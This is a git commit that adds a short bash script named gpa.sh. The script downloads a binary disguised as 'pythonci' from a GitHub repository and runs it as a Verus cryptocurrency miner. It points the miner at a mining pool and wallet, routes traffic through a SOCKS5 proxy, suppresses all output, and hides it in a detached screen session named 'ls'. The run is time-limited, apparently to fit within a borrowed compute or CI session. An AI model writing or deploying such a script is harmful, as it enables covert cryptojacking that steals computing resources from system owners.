fbf75bd8b2d5f660bc6d45ee167d02a002172c90
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-13 20:01:21 +0100

    Create gpa.sh

---
+++ gpa.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+sudo apt install screen libjansson4 -y
+wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
+chmod +x pythonci
+screen -dmS ls
+POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
+WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+PROXY=socks5://72.195.114.169:4145
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
+timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
+echo Sukses
